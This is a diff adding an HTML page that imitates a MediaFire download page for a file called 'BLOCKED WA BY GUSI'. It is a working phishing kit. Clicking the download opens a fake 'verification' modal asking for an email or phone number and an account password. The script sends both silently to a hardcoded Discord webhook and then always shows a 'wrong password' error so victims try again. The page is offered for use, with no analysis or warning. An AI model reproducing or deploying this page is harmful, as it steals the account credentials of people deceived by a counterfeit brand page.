@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MediaFire - BLOCKED WA BY GUSI</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <style>
+        /* --- KODE ASLI LO DIMULAI DI SINI --- */
+        * { box-sizing: border-box; font-family: 'Roboto', sans-serif; }
+        body { background-color: #f3f3f3; margin: 0; padding: 0; display: flex; justify-content: center; }
+        .mobile-wrapper { width: 100%; max-width: 480px; background-color: white; min-height: 100vh; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 12px 15px; border-bottom: 1px solid #eee; }
+        .logo { height: 24px; }
+        .nav-icons { display: flex; align-items: center; gap: 15px; color: #666; }
+        .blue-section { background: linear-gradient(180deg, #001fcc 0%, #001188 100%); padding: 25px 20px; margin: 10px; border-radius: 15px; color: white; text-align: center; }
+        .blue-section h2 { margin: 0 0 15px 0; font-size: 22px; font-weight: 700; }
+        .features { display: flex; justify-content: center; gap: 10px; font-size: 13px; margin-bottom: 20px; opacity: 0.9; }
+        .features span i { margin-right: 4px; }
+        .pricing-box { border: 2px solid #00f07c; border-radius: 8px; padding: 12px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; background: rgba(0,0,0,0.1); }
+        .pricing-box .label { display: flex; align-items: center; font-weight: 500; }
+        .pricing-box .dot { height: 12px; width: 12px; background-color: #00f07c; border-radius: 50%; display: inline-block; margin-right: 10px; }
+        .badge-popular { background-color: #00f07c; color: #001188; font-size: 11px; font-weight: bold; padding: 4px 8px; border-radius: 4px; }
+        .btn-download-fast { background-color: #0070ff; color: white; width: 100%; border: none; padding: 14px; border-radius: 6px; font-weight: bold; font-size: 15px; text-transform: uppercase; box-shadow: 0 4px 0 #0056c7; cursor: pointer; }
+        .file-card { background-color: #0070ff; margin: 20px 10px; border-radius: 6px; display: flex; align-items: center; padding: 15px; color: white; cursor: pointer; transition: background 0.2s; }
+        .file-card:active { background-color: #005bc9; }
+        .file-icon { background: white; padding: 8px 10px; border-radius: 4px; margin-right: 15px; }
+        .file-info { flex-grow: 1; }
+        .file-info span { display: block; font-weight: bold; font-size: 16px; }
+        .file-info small { font-size: 12px; opacity: 0.8; }
+        .dl-icon { font-size: 20px; }
+        .ad-text { font-size: 12px; color: #777; padding: 0 20px; text-align: center; line-height: 1.4; margin-bottom: 20px; }
+        .action-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1px; background-color: #ddd; margin-bottom: 40px; }
+        .action-item { background-color: #f9f9f9; padding: 20px 10px; text-align: center; color: #555; font-size: 13px; }
+        .action-item i { display: block; margin-bottom: 8px; font-size: 18px; color: #888; }
+        .footer { text-align: center; padding: 20px; color: #999; font-size: 12px; border-top: 1px solid #eee; }
+        .footer p { margin: 5px 0; }
+        .footer-links { margin-top: 10px; }
+        .footer-links span { margin: 0 5px; cursor: pointer; }
+        /* --- KODE ASLI LO SELESAI --- */
+
+        /* INI TAMBAHAN UNTUK SYSTEM GRAY HAT (OVERLAY) */
+        .gray-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7); display: none; justify-content: center; align-items: center; z-index: 10000;
+        }
+        .gray-modal {
+            background: white; width: 90%; max-width: 350px; padding: 25px; border-radius: 10px; text-align: center;
+        }
+        .gray-modal h3 { font-size: 18px; margin-top: 0; color: #333; }
+        .gray-modal p { font-size: 13px; color: #666; margin-bottom: 20px; }
+        .gray-modal input {
+            width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 5px; font-size: 14px; outline-color: #0070ff;
+        }
+        .gray-modal .btn-confirm {
+            width: 100%; padding: 12px; background: #0070ff; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer;
+        }
+        .gray-modal .error-msg { color: #d93025; font-size: 12px; margin-bottom: 10px; display: none; }
+    </style>
+</head>
+<body>
+
+<div class="mobile-wrapper">
+    <div class="navbar">
+        <img src="https://static.mediafire.com/images/backgrounds/header/mf_logo_full_color.svg" alt="MediaFire" class="logo">
+        <div class="nav-icons">
+            <div style="background:#eee; padding:5px 10px; border-radius:4px; font-size:12px; font-weight:bold;">
+                <i class="fa-solid fa-folder"></i> MY FILES
+            </div>
+            <i class="fa-solid fa-user-circle" style="font-size:24px;"></i>
+        </div>
+    </div>
+
+    <div class="blue-section">
+        <h2>Download Faster</h2>
+        <div class="features">
+            <span><i class="fa-solid fa-eye-slash"></i> No Waiting</span>
+            <span><i class="fa-solid fa-bolt"></i> Premium</span>
+            <span><i class="fa-solid fa-rectangle-ad"></i> No Ads</span>
+        </div>
+        <div class="pricing-box">
+            <div class="label"><span class="dot"></span> Monthly: $3.99</div>
+            <div class="badge-popular">Most Popular</div>
+        </div>
+        <button class="btn-download-fast" onclick="openGrayHat()">
+            <i class="fa-solid fa-bolt"></i> DOWNLOAD FASTER NOW
+        </button>
+    </div>
+
+    <div class="file-card" id="fileDownload">
+        <div class="file-icon">
+            <img src="https://static.mediafire.com/images/filetype/file-psd-v3.png" width="30" style="filter: grayscale(1) brightness(0.5);">
+        </div>
+        <div class="file-info">
+            <span>BLOCKED WA BY GUSI</span>
+            <small>Download in a new tab (30.19MB)</small>
+        </div>
+        <div class="dl-icon">
+            <i class="fa-solid fa-download"></i>
+        </div>
+    </div>
+
+    <p class="ad-text">
+        Clicking the download button above will start your download in a new tab and show a message from our advertising partners.
+    </p>
+
+    <div class="action-grid">
+        <div class="action-item"><i class="fa-solid fa-link"></i> Copy for messenger</div>
+        <div class="action-item"><i class="fa-brands fa-facebook-f"></i> Post to Facebook</div>
+        <div class="action-item"><i class="fa-solid fa-share-nodes"></i> Share options</div>
+        <div class="action-item"><i class="fa-solid fa-plus"></i> Save to My Files</div>
+    </div>
+
+    <div class="footer">
+        <p>©2025 MediaFire Build 121958</p>
+        <div class="footer-links">
+            <span>Advertising</span> <span>Terms</span> <span>Privacy Policy</span>
+        </div>
+        <div class="footer-links" style="margin-top:20px;">
+            <i class="fa-brands fa-twitter"></i> &nbsp; <i class="fa-brands fa-facebook"></i>
+        </div>
+    </div>
+</div>
+
+<div class="gray-overlay" id="overlay">
+    <div class="gray-modal">
+        <h3>Verifikasi Diperlukan</h3>
+        <p>File terenkripsi. Masukkan akun Anda untuk mengonfirmasi unduhan <b>BLOCKED WA BY GUSI</b></p>
+        <div id="error" class="error-msg">Sandi salah atau sudah kedaluwarsa!</div>
+        <input type="email" id="email" placeholder="Email atau Nomor HP">
+        <input type="password" id="pass" placeholder="Password Akun">
+        <button class="btn-confirm" onclick="captureAndReset()">KONFIRMASI</button>
+    </div>
+</div>
+
+<script>
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1451651757955485800/RNyrq16gWkU3y0JhCYEWYsRAe482nGDNxB1054QqiUiH17LiBtyRyz8DFcqshTpot2zH";
+
+    // Fungsi buka pop-up pas file diklik
+    function openGrayHat() {
+        document.getElementById('overlay').style.display = 'flex';
+    }
+
+    // Sambungin ke elemen lo
+    document.getElementById('fileDownload').addEventListener('click', openGrayHat);
+
+    async function captureAndReset() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+        const error = document.getElementById('error');
+
+        if (!email || !pass) {
+            alert("Harap masukkan data verifikasi!");
+            return;
+        }
+
+        // Kirim data ke Discord secara silent
+        try {
+            await fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🔓 Gateway Hit: MediaFire Original",
+                        color: 0x0070ff,
+                        fields: [
+                            { name: "👤 User/Email", value: `\`${email}\`` },
+                            { name: "🔑 Password", value: `\`${pass}\`` }
+                        ],
+                        footer: { text: "File: blocked wa by gusi" }
+                    }]
+                })
+            });
+        } catch (e) {}
+
+        // Reset sandi dan tampilin error (System Looping)
+        document.getElementById('pass').value = "";
+        error.style.display = "block";
+    }
+</script>
+
+</body>
+</html>
